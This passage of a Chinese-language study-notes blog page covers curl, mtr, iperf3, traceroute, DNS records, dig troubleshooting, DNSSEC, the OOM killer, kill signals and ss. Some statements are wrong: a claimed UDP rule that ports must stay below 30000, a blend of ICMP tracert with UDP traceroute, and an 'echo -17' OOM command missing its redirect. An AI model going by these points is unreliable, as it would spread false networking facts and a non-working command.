class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --cookie stored_cookies_file_path http://www.example.com</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>curl指定攜帶User Agent</strong>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --user-agent &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot; http://www.example.com</span><br></pre></td></tr></table></figure><ul><li><strong>Basic Authentication:</strong> 若網頁有使用基本的Authentication則可攜帶<code>--user username:password</code> 來通過驗證  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -i --user secret:vary_secret http://www.example.com/api/resources</span><br></pre></td></tr></table></figure></li></ul></li><li>透過curl指令使用proxy做連接<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --proxy yourproxy:port https://youurl.com</span><br></pre></td></tr></table></figure></li><li>curl限定下載速度<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --limit-rate 2000B [URL]</span><br></pre></td></tr></table></figure></li><li><strong>在請求中注入特定Content-Type來處理特定問題</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --header &#x27;Content-Type: application/json&#x27; http://yoururl.com</span><br></pre></td></tr></table></figure></li><li>僅在回應中呈現header<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --head http://yoururl.com</span><br></pre></td></tr></table></figure></li><li><strong>連接 HTTPS&#x2F;SSL URL 並忽略任何 SSL 憑證錯誤</strong><ul><li>當試圖存取SSL&#x2F;TLS憑證的安全URL時候，若出現憑證錯誤或CN不匹配，則會出現以下錯誤<br>  <code>curl: (51) Unable to communicate securely with peer: requested domain name does not match the server&#39;s certificate.</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --insecure https://yoururl.com</span><br></pre></td></tr></table></figure></li></ul></li><li>使用特定協定(SSL&#x2F;TLS)連線<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl --sslv3 https://yoururl.com</span><br><span class="line">$ curl --tlsv1 https://example.com</span><br><span class="line">$ curl --tlsv1.0 https://example.com</span><br><span class="line">$ curl --tlsv1.1 https://example.com</span><br><span class="line">$ curl --tlsv1.2 https://example.com</span><br><span class="line">$ curl --tlsv1.3 https://example.com</span><br></pre></td></tr></table></figure></li><li>從FTP Server中下載檔案<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -u user:password -O ftp://ftpurl/style.css</span><br></pre></td></tr></table></figure></li><li>可以講解一下MTR指令怎麼用嗎?<ul><li><a href="https://blog.gtwang.org/linux/mtr-linux-network-diagnostic-tool/"><strong>MTR</strong></a><ul><li>指令實作: MTR 在一開始會針對指定的主機，以 traceroute 找出中間的每一個網路節點（閘道器、路由器、橋接器等），然後使用 ping 去檢查每一個節點的網路連線狀況，即時更新在輸出的報表中，讓管理者一目了然。  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mtr www.google.com.tw   </span><br><span class="line">mtr -n www.google.com.tw //統一以ip位址來呈現</span><br><span class="line">mtr -b www.google.com.tw //同時呈現ip位址以及網域名稱</span><br><span class="line">mtr -c 5 www.google.com.tw // 指定ping 上限(ICMP ECHO 上限)</span><br><span class="line">mtr -c 5 -r www.google.com.tw &gt; output.txt //輸出報表</span><br><span class="line"></span><br></pre></td></tr></table></figure>  <img src="https://i.imgur.com/BSFP2pP.png"></li><li>L(Loss): 封包遺失率</li><li>S(Snt,Sent Packet): 封包發送數</li><li>Avg(Average RTT): </li><li>Best(Best RTT):</li><li>Worst(Worst RTT):</li></ul></li><li>所以從這個工具中可以發現甚麼?????</li></ul></li><li>可以講解一下 <code>iperf</code> 指令怎麼使用嗎?<ul><li>&#x3D; <code>iperf3</code>是一種網路頻寬測試工具，可以測試客戶端上傳資料速度</li><li>透過TCP來測量頻寬、確定鏈路品質跟延遲以及抖動和封包遺失</li><li>測時頻寬時，需要同時在server與client端都各執行一個iperf3程式，讓他們互相傳送資料進行測試  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># server端   </span><br><span class="line">iperf3 -s   //打開監聽socket 預設port為5201，開放Server Thread</span><br></pre></td></tr></table></figure>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># client端</span><br><span class="line">iperf3 -c SERVER_IP/HOSTNAME</span><br></pre></td></tr></table></figure></li><li>iperf3 也支援Android以及IOS的使用(有APP)</li><li>指定測試時間  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iperf3 -c SERVER_IP -t 20 -i 4 //測試20秒，每隔4秒輸出一次測試數據</span><br></pre></td></tr></table></figure></li><li>儲存測試結果  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iperf3 -c SERVER_IP --logfile output.txt</span><br></pre></td></tr></table></figure></li><li>指定port  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Server端</span><br><span class="line">iperf3 -s -p 12345</span><br><span class="line"></span><br><span class="line"># client端</span><br><span class="line">iperf3 -c SERVER_IP -p 12345</span><br></pre></td></tr></table></figure></li><li>多條連線  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#同時使用兩條連線測試</span><br><span class="line">iperf3 -c SERVER_IP -P 2</span><br></pre></td></tr></table></figure></li><li>若要測試UDP傳輸協定效能，可以使用 <code>-u</code> 參數  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iperf3 -c SERVER_IP -u</span><br></pre></td></tr></table></figure></li><li>反向傳輸:測試下載速度(server傳送，cleint接收)<ul><li>預設資料流: client $\rightarrow$ Server  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iperf3 -c SERVER_IP -R</span><br></pre></td></tr></table></figure></li></ul></li><li>IPv4、IPv6  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iperf3 -c SERVER_IP -f</span><br><span class="line">iperf3 -c SERVER_IP -6</span><br></pre></td></tr></table></figure></li><li>自訂傳送檔案  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iperf3 -c SERVER_ip -F YOUR_FILE</span><br></pre></td></tr></table></figure></li></ul></li><li>可以講解一下 <code>tracert</code> 指令怎麼使用嗎?甚麼情況下你會用到這個指令?<br>主要是用於即時網絡故障排除，以查找封包在通過網路傳輸到其目標地址時所採用的路由路徑<br>主要是透過發送ICMP封包，並設定IP Header上的TTL欄位來達成traceroute功能的<br>每次送出的為3個40bytes的封包，包括source位址，目的位址和封包發出的timestamp到目的地，第一個會是probe(探測用)，然後是走UDP，由於我們不想目的主機處理它們，因此目的埠設定為一個不可能的值<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tracert -d -h maximum_hops -j host_list -w timeout target_host</span><br><span class="line">-w 要指定等待timeout的毫秒數</span><br></pre></td></tr></table></figure></li><li>當 <code>tracert</code> 指令中出現星號代表甚麼?<ul><li>若tracert出現星號(*)，代表該節點可能有某些防禦措施，使我們的封包被丟棄<ul><li>可能是iptables設定為Drop之類的</li></ul></li></ul></li><li>講解一下 <code>tracert</code> 指令的原理是甚麼嗎?<ul><li>特性1: 主要是透過 TTL(Time_To_Live)值來是現功能的，每經過一個節點，路由器就會幫TTL值減1</li><li>特性2: 主要呼叫者會發出 TTL&#x3D;1的封包，第一個路由器將TTL減1後得到0，不再繼續值轉發此封包</li><li>而會返回一個ICMP Time_Out Response，然後電腦就會從Response中提取出封包經過的第一個gateway地址</li><li>接著發出一個TTL&#x3D;2的ICMP封包，可以獲得第二個gateway地址</li><li>因此依次遞增TTL值便獲取沿途所有Gatewat位址</li></ul></li><li>如果 <code>tracert</code> 回傳response並不是ICMP Time_Out，代表甚麼?<ul><li>大多防火牆或啟用防火牆功能的路由器預設會不返回各種ICMP封包</li><li>其餘路由器或交換器可被admin設定成不返回ICMP Response</li><li><strong>因此 Traceroute程式不一定能夠拿到所有沿途gateway位址</strong><ul><li>當某個TTL值的封包得不到回覆時，並不能停止這一追蹤過程，程式仍然會把TTL遞增然後發出下一個封包，一直到預設會透過參數指定的<strong>追蹤限制(maximum_hops)</strong></li></ul></li></ul></li><li>若無法回應ICMP Response，那又是如何知道封包抵達了?<ul><li>Traceroute在送出UDP datagrams到目的地時，它所選擇送達的port number 是一個一般應用程式都不會用的號碼（<strong>30000 以上</strong>）</li><li>所以當此UDP datagram 到達目的地後該主機會送回一個「<strong>ICMP port unreachable</strong>」的訊息，而當traceroute 收到這個訊息時，便知道目的地已經到達了。</li></ul></li><li>為甚麼traceroute要使用大於30000的port<ul><li>跟UDP規定port號必須小於30000有關</li><li>若使用UDP則可能會因為主機沒有提供 UDP 服務而簡單將封包拋棄，然後不返回任何資訊</li><li>所以使用大於30000的port，目標主機能做的是就是返回一個 <strong>port不可達</strong> 的回應</li></ul></li><li><a href="https://haway.30cm.gg/dns-1-basic/">甚麼是FQDN(完整網域名稱?)</a><ul><li>在&#x2F;etc&#x2F;resolv.conf中，沒有加上”.” 結尾的主機名稱，都會被系統自動附加網域名稱</li><li>然後檔案中的<strong>search</strong> 就是告訴系統可以附加什麼樣的網域名稱  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">domain rsync.tw</span><br><span class="line">nameserver 168.95.1.1 (cache server)</span><br><span class="line">nameserver 8.8.8.8  (cache server)</span><br><span class="line">search hdns.com.tw example.com</span><br></pre></td></tr></table></figure></li><li>上方範例中只要輸入blog，系統就會自動改為blog.rsync.tw並送到168.95.1.1去做DNS解析，但如果不成功就會換成blog.hdns.com.tw再次嘗試，以此類推</li><li>若168.95.1.1的DNS服務無法連上，系統就會自動跳到第二筆的8.8.8.8伺服器</li></ul></li><li>要怎麼設定DNS Cache Server?<ul><li>去&#x2F;etc&#x2F;resolv.conf更改 nameserver</li></ul></li><li><strong>DNS權威Server以及DNS Cache Server差別?</strong><ul><li>DNS Authoritative Server:會從自己的資料庫取出DNS紀錄並回應請求</li><li>Cache Server則是去詢問其他主機的DNS資料</li></ul></li><li>DNS中甚麼是NS(Nameserver)紀錄?<br>  <img src="https://i.imgur.com/YMAcJ1x.png"><ul><li>root server會去記錄每個子網域的授權主機位置就是透過NS Record</li><li>NS Record的用途有兩個:一個是向下授權、一個是平行授權</li><li>向下授權: 建立一個子網域 (EX. 跟Server建立一個.tw的子網域)，並授權給TWNIC的主機</li><li>平行授權: 同個網域名稱的所有NameServer，都必須有相同的NS紀錄<br>  <img src="https://i.imgur.com/9mo0lwG.png"></li><li>上面就是 ntpu.edu.tw 已經授權給六台nameserver，這六台的ntpu.edu.tw的ns紀錄必須完全一樣</li></ul></li><li>要怎麼知道自己的DNS主機目前正式授權到哪些主機上面?<ul><li>購買網域名稱時後填寫的Nameserver，註冊商會依照所註冊的域名</li><li>把你的nameserver送給Registry，Registry確認後就會把你的主機資料放入他們的紀錄中</li><li>就會產生一組NS資料  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dig [domain] ns</span><br></pre></td></tr></table></figure></li><li>透過上述指令確認目前NameServer資料是否跟註冊時填寫一致</li></ul></li><li>甚麼是SOA Record?<ul><li>SOA紀錄是<strong>網域名稱的系統管理紀錄</strong></li><li>若使用代管則不需要處理(CloudFlare, Gandi LiveDNS)</li><li>自架的DNS主機則會需要設定</li><li>主要代表者會是網域名稱的管理者、管理主機、區域檔序號與全域性的TTL資料</li></ul></li><li>甚麼是A&#x2F;AAAA紀錄<ul><li>當要將網域名稱對應到Server的IP位址時，就需要用到A紀錄</li><li>A紀錄指向到IPv4位址</li><li>AAAA紀錄指向到IPv6位址  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ dig +short blog.rsync.tw a</span><br><span class="line">$ dig +short blog.rsync.tw aaaa</span><br></pre></td></tr></table></figure></li></ul></li><li>甚麼是MX紀錄?<ul><li>這個網域的mail server紀錄</li><li>如果有人寄信給你，郵件主機會優先查詢這個網域名稱有沒有 MX 紀錄</li><li>如果有，就會連線到郵件主機，如果沒有特別設定 MX 紀錄</li><li>寄送郵件的主機會嘗試解析網域名稱的 A 紀錄</li><li>如果有 A 紀錄，就會嘗試連線主機的郵件伺服器。<br>  <img src="https://i.imgur.com/eQNw7LE.png"></li><li>當Domain Name有MX紀錄，mail主機會嘗試連線mg.ntust.edu.tw</li><li>MX紀錄中可以設定mail server優先順序，數值越小的優先</li><li>所以寄給ntust.edu.tw的信，會優先送給 mg.ntust.edu.tw</li><li>若沒有mx紀錄，則會送給Domain Name名稱的A紀錄，即140.118.31.99<br>  <img src="https://i.imgur.com/rO5idoQ.png"></li></ul></li><li>甚麼是CNAME紀錄?<ul><li><strong>主機名稱的別名的一種</strong>，當你的目的位址是主機名稱時，而不是IP位址</li><li>這時則須要使用CNAME進行對應</li><li>限制: 同一筆紀錄底下如果有設定CNAME紀錄，就不能設定其他紀錄<ul><li>為甚麼?</li></ul></li><li>EX. <strong>若設定某個domain的CNAME，則不可設定A、MX、TXT等紀錄</strong></li></ul></li><li>若有人設定某個Domain Name的CNAME，例如我註冊 HelloWorld.tw 然後想要把網頁瀏覽者連到跟blog.HelloWorld.tw一樣的網站，所以設定了  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HelloWorld.tw  CNAME  blog.HelloWorld.tw</span><br></pre></td></tr></table></figure><ul><li>但HelloWorld.tw一定帶有SOA與NS紀錄，會跟CNAME產生衝突，會造成網域名稱運作不穩定，所以若要完成一樣的功能可以透過網頁跳轉的方式來完成</li></ul></li><li>可以講解一下 <code>dig</code> 指令怎麼使用嗎?甚麼情況下你會用到這個指令?.<ul><li>是一種DNS除錯工具，能夠模擬一般電腦查詢、遞迴查詢、非遞迴查詢、DNS 快取伺服器查詢、DNSSEC 查詢、TCP 查詢等等。</li><li><code>dig</code> 的回應區段<br>  <img src="https://i.imgur.com/kHAra1e.png"><ul><li>Header<br>  <img src="https://i.imgur.com/nr5u3aS.png"><ul><li>ID: 純數字，DNS查詢的識別碼</li><li>QR:0查詢 1 回應</li><li>Opcode: 0 QUERY,1 IQUERY, 2 STATUS</li><li>AA: 權威伺服器回應</li><li>TC: 截斷</li><li>RD: 用戶端是否要求遞迴查詢</li><li>RA: 伺服器回應是支援遞迴查詢</li><li>Z: 保留</li><li>RCODE: 0沒有錯誤、1-5 錯誤代碼</li><li>QDCOUNT: Question區段的資料數量</li><li>ANCOUNT: Answer區段的資料數量</li><li>NSCOUNT: Authority區段的資料數量</li><li>ARCOUNT: Additional區段的資料數量</li></ul></li><li>Question</li><li>Answer</li><li>Authority</li><li>Additional</li></ul></li><li><code>dig</code>的參數<ul><li><code>@server</code> 指定伺服器，<strong>對哪台Server發出DNS查詢，若不指定則使用系統預設</strong></li><li><code>+short</code> 簡略輸出，只顯示ANSWER部分，若沒回應則顯示空白</li><li><code>-4</code> 只使用 IPv4位址進行與Server的連線</li><li><code>-6</code> 只使用 IPv6位址進行與Server的連線</li><li><code>+tcp</code> 使用TCP的方式與DNS Server連線<ul><li><strong>DNS原生是使用 UDP&#x2F;53 協定</strong>，若有人忘記開啟主機或IP分享器的防火牆</li><li>則會透過 <code>+tcp</code> 的方式將DNS查詢改為TCP連線</li><li>若一般查詢沒回應，而<code>+tcp</code>會過，則代表防火牆沒有開啟</li></ul></li><li><code>cdflag</code> 用於關閉DNSSEC查詢<ul><li>DNSSEC是一種DNS的延伸安全協定，可以確保DNS紀錄無法被偽造(透過電子簽章的方式)</li><li>若DNSSEC管理不當則會造成DNSSEC驗證失敗</li><li>會發生不穩定的DNS解析</li><li>此時可以透過此參數將其關閉</li><li>若一般查詢沒回應，但+cdflag後有正確回應，則代表DNSSEC壞掉</li></ul></li></ul></li><li>指令範例  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 查詢快取Server的A紀錄</span><br><span class="line">$ dig @8.8.8.8 blog.rsync.tw. a</span><br><span class="line"># 查詢Domain Name的MX</span><br><span class="line">$ dig rsync.tw mx</span><br><span class="line"># 查詢Domain Name負責人</span><br><span class="line">$ dig rsync.tw soa</span><br><span class="line"># 追蹤模式</span><br><span class="line">$ dig +trace blog.rsync.tw a</span><br><span class="line"># tcp查詢模式</span><br><span class="line">$ dig +tcp blog.rsync.tw a</span><br><span class="line"># 查詢IP反解  = nslookup &lt;IP&gt;</span><br><span class="line">$ dig -x 8.8.8.8 ptr</span><br><span class="line"># 關閉DNSSEC查詢</span><br><span class="line">$ dig +cdflag @8.8.8.8 blog.rsync.tw a</span><br></pre></td></tr></table></figure></li></ul></li><li>DNS Troubleshooting<ul><li>step 1 : 查詢NS位址<ul><li>在你作 dig 除錯開始之前，首先你要確認網域名稱的名稱伺服器(NameServer) 位址，因為所有回應都一定從名稱伺服器回應，所有使用Domain Name Registry或是Cloudfare之類的服務則NameServer會是這些業者，也有是註冊時填寫的NameServer欄位資料  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dig +short rsync.tw ns</span><br></pre></td></tr></table></figure></li><li>可看出NameServer是哪幾台(DNS紀錄由哪幾台負責)</li><li>或是由淺入深從較高層的DNS Server查下來  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dig +short tw ns</span><br></pre></td></tr></table></figure>  <img src="https://i.imgur.com/4t141yp.png">  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dig +short @a.dns.tw edu.tw ns</span><br></pre></td></tr></table></figure>  <img src="https://i.imgur.com/EZmwnTT.png">  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dig +short  @moestar.edu.tw [target domain name] ns</span><br></pre></td></tr></table></figure></li><li>為何不直接 dig +short ntust.edu.tw ?<br>  <img src="https://i.imgur.com/6miPWp1.png"><ul><li>因為這樣會透過系統Cache Server去查詢DNS NS紀錄</li></ul></li></ul></li><li>可能發生的情況:<ul><li>空的、沒回應<ul><li>如果你在查詢 NS 的時候出現錯誤，或是發現有回應，但是沒有資料</li><li>可能情況-1: NameServer填錯，請Domain Name Registry檢查</li><li>可能情況-2: 網遇到期沒繳錢，或狀況有問題(透過<code>Whois</code> 指令來查看)</li></ul></li><li>NameServer是Public DNS<ul><li>有人會把Public DNS以為是NameServer，就把8.8.8.8填入nameserver那邊，但這樣是不對的</li></ul></li><li>跟你填的資料不同<ul><li>Domain Name Registry沒有將你的名稱更新到域名管理局或是你剛好更換NameServer中</li></ul></li></ul></li><li>Step 2 : 直接查詢Name Server的資料<ul><li>確認NS位址後，接下來對Name Server送出查詢</li><li>查詢你要解析的域名，稱伺服器回應的資料應該是最新、最完整的，所以你要知道紀錄更新了沒、解析到底正不正確，都是透過直接查詢名稱伺服器來獲得解答。<br>  <img src="https://i.imgur.com/MHvHAb6.png"></li></ul></li><li>可能發生的問題-2:<ul><li>NameServer同步不一致<ul><li>確保每台NameServer回應資料都是正確的</li></ul></li><li>NameServer無回應<ul><li>代表NameServer的DNS服務有問題</li><li>可能DNS服務沒啟用或機器有問題</li><li>可以ping一下NameServer，如果有回應就是DNS服務的問題</li><li>則可透過 <code>dig +tcp</code>來檢查是不是防火牆的問題</li><li>若有回應則要朝向防火牆的問題去解決  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#查詢Name Server回應，可以查詢SOA，因為一定有這筆紀錄</span><br><span class="line">$ dig @(NS IP) (domain) soa</span><br><span class="line">#如果沒回應，ping看看是不是主機或網路問題</span><br><span class="line">$ ping (NS IP)</span><br><span class="line"># 如果ping有回應，則改用+tcp 來檢查是不是防火牆問題</span><br><span class="line">$ dig +tcp @(NS IP) (domain) soa</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li>Step 3 : 檢查Authority Server回答<ul><li>nameserver通常是由上往下授權<ul><li>ex. rsync.tw nameserver是由.tw往下授權到 ns[1-3].gandi.net的nameserver的</li></ul></li><li>授權不一定正確(其實是使用者自己填的，可能會填錯)，上層依照使用者輸入的資料直接變成NameServer</li><li>正確授權:<ul><li><ol><li>由上對下正確授權</li></ol></li><li><ol start="2"><li>伺服器具備權威伺服器的回答  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ dig @ns1.gandi.net rsync</span><br><span class="line"></span><br><span class="line"># response</span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.3-P4-Ubuntu &lt;&lt;&gt;&gt; @ns1.gandi.net rsync.tw a</span><br><span class="line">; (2 servers found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 45858</span><br><span class="line">;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line">;; WARNING: recursion requested but not available</span><br><span class="line">...omit...</span><br></pre></td></tr></table></figure></li></ol></li></ul></li><li>不使用 +short 參數，就可以看到Header部分，可以看Header中的<strong>AA Flag</strong> </li><li>回應中，有一個 “flags: qr aa rd;”，aa &#x3D; AA 就是權威伺服器回答的意思</li><li>代表這台Server知道自己管理了此網域，所以從區域檔中的資料回應給查詢端</li><li>對Public DNS查詢則不會有這個AA Flag</li><li>而若是對Name Server查詢而沒有AA，則代表管理員沒有正確設定Server</li></ul></li><li>Step 4 : 查詢Cache Server(Public DNS)<ul><li>最後一步就是要查詢快取伺服器的回應資料，看看是否正確，一般所有的用戶電腦都會透過快取伺服器 (譬如8.8.8.8、168.95.1.1) 取得 DNS 的資料，所以我們要測試一下是否正確：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dig @8.8.8.8 www.rsync.tw a</span><br></pre></td></tr></table></figure></li></ul></li><li>可能發生的問題-4<ul><li>查詢到舊資料<ul><li>DNS 有TTL暫存時間</li><li>暫存時間內，都會保留資料直到TTL(秒)時間過去</li><li>這時需要確認每個Authority Server的查詢是否都是最新資料</li></ul></li><li>解析失效NXDOMAIN<ul><li>若上述查詢過程中都沒問題，但Public DNS這些快取Server卻沒反應</li><li>可能是 DNSSEC壞掉了</li><li>此時需要找你的Domain Name的註冊商去取消你的DNSKEY金鑰</li></ul></li></ul></li></ul></li><li>[DNSSEC壞掉會發生甚麼事?該怎麼修復]<a href="https://haway.30cm.gg/dnssec-broken/">(https:&#x2F;&#x2F;</a>)?<ul><li>現象:<ul><li>可能就只有透過授權給你的domain的權威DNS Server能夠查詢到你的A紀錄</li><li>但你如果查詢Public DNS Server(ex. 8.8.8.8)中A的你的domain的A紀錄可能藉會報錯</li></ul></li><li>檢查: <ul><li>這時可以透過 加上 <code>+cdflag</code> 參數來讓DNS Cache Server關閉DNSSEC驗證</li><li><code>cdflag</code> 就是告訴8.8.8.8，這個DNS查詢不需要進行DNSSEC驗證</li></ul></li><li>可能原因:<ul><li>若使用了某個域名代管服務，並開啟了DNSSEC</li><li>但後續又將Nameserver變更，這將會導致DNSSEC Chain 驗證失敗</li><li>因為DNSKEY沒有被移轉(新的Name Server中沒有DNSKEY)，則會導致驗證失敗</li></ul></li><li>解決方式: <ul><li>或是使用域名註冊商提供的介面並關閉DNSSEC的功能</li><li>或是在新的NameServer上重新簽署DNSSEC，然後更新DNSKEY</li></ul></li></ul></li><li>在LINUX中如何開啟DNSSEC?<ul><li>可修改 &#x2F;etc&#x2F;systemd&#x2F;resolv.conf中的DNSSEC設定值</li></ul></li><li>在&#x2F;etc&#x2F;resolv.conf中設定的nameserver被重置怎麼辦?<ul><li>透過 symbolic link指向 &#x2F;etc&#x2F;systemd&#x2F;resolv.conf  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cd /etc</span><br><span class="line">$ rm resolv.conf</span><br><span class="line">$ ln -s /run/systemd/resolve/resolv.conf resolv.conf</span><br></pre></td></tr></table></figure></li><li>直接修改 &#x2F;etc&#x2F;systemd&#x2F;resolv.conf 中的DNS位址</li></ul></li><li>你會去怎麼處理Linux中Process的OOM問題?</li><li>甚麼是<strong>OOM Killer</strong>?<ul><li>Linux中負責監控那些占用memory過大，尤其是瞬間很快消耗大量memory的process</li><li>為了防止memory耗盡而kernel會把該process kill掉</li><li>有時候SSH不到機器，但能 ping 通，說明不是網絡的故障，很多原因是 sshd process被 OOM killer 殺掉了</li><li>Kernel會通過特定的演算法給每個process計算一個分數來決定殺哪個process</li><li>每個process的 OOM 分數可以在「**&#x2F;proc&#x2F;PID&#x2F;oom_score**」中找到</li><li>重啟機器後查看系統日誌「**&#x2F;var&#x2F;log&#x2F;messages**」會發現「Out of Memory: Kill process 1865（sshd）」類似的錯誤訊息</li><li><code>echo -17 /proc/PID/oom_adj</code> 來解決這個問題<ul><li>可調範圍: 15~ -16</li><li>-17是禁用</li></ul></li><li>或是修改Kernel參數:  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w vm.panic_on_oom=1 (預設為0)</span><br><span class="line">sysctl -p</span><br></pre></td></tr></table></figure></li></ul></li><li><code>kill -9</code> 與 <code>kill -15</code> 差別在哪?送的signal是甚麼?  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ kill PID</span><br><span class="line"># 訊號: SIGKILL</span><br><span class="line">$ kill -9 PID //立即強制停止程式執行</span><br><span class="line"># 訊號: SIGTERM</span><br><span class="line">$ kill -15 PID //以正常程序通知程式停止執行，預設的訊號</span><br><span class="line">$ kill -l 列出所有可用訊號</span><br><span class="line"></span><br></pre></td></tr></table></figure>  <img src="https://i.imgur.com/1INBiak.png"></li><li>怎麼查詢kill指令中哪個訊號對應甚麼數字<ul><li><code>$ kill -l &lt;數字&gt;</code></li></ul></li><li>可以解釋一下 <code>ss</code>指令的使用時機嗎?<ul><li>可以輸出所有已經建立的 TCP 連線</li><li>ss 指令可以自己指定篩選器（filter），篩選出自己需要的 sockets 資訊:  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 列出從本機連線到 192.168.0.1 這台主機的所有連線：</span><br><span class="line">$ ss -o state established dst 192.168.0.1</span><br><span class="line"># 列出從本機連線到 192.168.0.1 主機 80 連接埠的所有連線</span><br><span class="line">$ ss -o state established dst 192.168.0.1:80</span><br><span class="line"># 列出來自於 192.168.0.2 這台主機的所有連線：</span><br><span class="line">$ ss -o state established src 192.168.0.2</span><br><span class="line"># 列出所有 ssh 的連線，包含從本機往外的 ssh 連線，以及從外面連線進來的 ssh 連線：</span><br><span class="line">$ ss -o state established &#x27;( dport = :ssh or sport = :ssh 